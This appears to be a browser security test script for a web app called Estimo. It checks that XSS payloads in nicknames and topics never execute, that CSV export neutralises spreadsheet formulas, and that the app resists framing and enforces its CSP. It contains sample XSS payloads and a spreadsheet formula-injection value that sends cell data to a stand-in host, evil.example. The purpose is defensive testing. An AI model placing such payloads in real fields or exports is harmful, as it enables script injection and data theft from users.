"""Browser-side security tests for Estimo (XSS, CSV formula injection, clickjacking).

    node scripts/local-server.mjs 8787 &
    python3 test/browser_security.py http://localhost:8787

Requires: pip install playwright && playwright install chromium
"""
import csv, io, json, re, sys
from playwright.sync_api import sync_playwright

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8787"
PAYLOADS = [
    '<img src=x onerror="window.__xss=1">',
    '"><svg onload="window.__xss=2">',
    "</textarea><script>window.__xss=3</script>",
    "javascript:window.__xss=4",
    "{{constructor.constructor('window.__xss=5')()}}",
]
results = []

def check(tid, title, ok, detail=""):
    results.append(ok)
    print(f"  {'✓' if ok else '✗'} {tid} {title}" + ("" if ok else f"\n      → {detail}"))

print(f"Estimo browser security tests → {BASE}\n")
with sync_playwright() as p:
    b = p.chromium.launch()
    room = "sec-browser-" + str(abs(hash(BASE)) % 10**6)

    # attacker sets malicious nickname + topic + votes
    atk_ctx = b.new_context(); atk = atk_ctx.new_page()
    atk.goto(BASE)  # attacker creates the room (and becomes host) with a malicious nickname
    atk.fill("#nick", PAYLOADS[0][:24]); atk.click("#create-form button[type=submit]"); atk.wait_for_selector(".table")
    room = atk.url.rsplit("/", 1)[1]

    vic_ctx = b.new_context(accept_downloads=True); vic = vic_ctx.new_page()
    vic.goto(f"{BASE}/r/{room}")
    vic.fill("#gnick", "Victim"); vic.click("text=Join room"); vic.wait_for_selector(".table")

    for pl in PAYLOADS:
        atk.fill("#topic", pl); atk.wait_for_timeout(500)
        atk.evaluate("n => { localStorage.setItem('estimo.name', JSON.stringify(n)); }", pl[:24])
    atk.fill("#topic", '=HYPERLINK("http://evil.example/?leak="&A1,"click")')
    atk.wait_for_timeout(500)
    atk.click("button[data-act=vote][data-v='5']")
    vic.click("button[data-act=vote][data-v='8']")
    vic.wait_for_timeout(300)
    vic.click("text=Reveal cards"); vic.wait_for_timeout(500)
    vic.click("text=Save & next ticket"); vic.wait_for_timeout(500)

    fired = vic.evaluate("window.__xss || 0") or atk.evaluate("window.__xss || 0")
    check("B01", "Script payloads in nickname/topic/history never execute", not fired, f"payload #{fired} executed")
    injected = vic.evaluate("document.querySelectorAll('#app img[src=x], #app svg[onload], #app script').length")
    check("B02", "Payloads are rendered as text, not markup", injected == 0, f"{injected} injected elements in DOM")

    # CSV export
    with vic.expect_download() as dl:
        vic.click("button[data-act=csv]")
    text = open(dl.value.path(), encoding="utf-8-sig").read()
    rows = list(csv.reader(io.StringIO(text)))
    bad = [c for r in rows[1:] for c in r if c[:1] in ("=", "+", "-", "@", "\t", "\r")]
    check("B03", "CSV export neutralises spreadsheet formulas", not bad, f"formula cells: {bad[:2]}")

    # Clickjacking: try to frame the app from another origin
    frame_page = b.new_context().new_page()
    frame_page.set_content(f'<iframe id="f" src="{BASE}/" style="width:800px;height:600px"></iframe>')
    frame_page.wait_for_timeout(1500)
    framed = frame_page.frame_locator("#f").locator("h1").count() > 0
    check("B04", "App cannot be embedded in a foreign iframe (clickjacking)", not framed, "app rendered inside iframe")

    # CSP violations on the real page (inline scripts blocked, app still works)
    errs = []
    pg = b.new_context().new_page()
    pg.on("console", lambda m: errs.append(m.text) if "Content Security Policy" in m.text and "fonts" not in m.text else None)
    pg.goto(BASE); pg.wait_for_selector("#create-form")
    check("B05", "App runs with the CSP enabled (no violations)", not errs, "; ".join(errs[:2]))
    b.close()

print(f"\n{sum(results)}/{len(results)} passed")
sys.exit(0 if all(results) else 1)
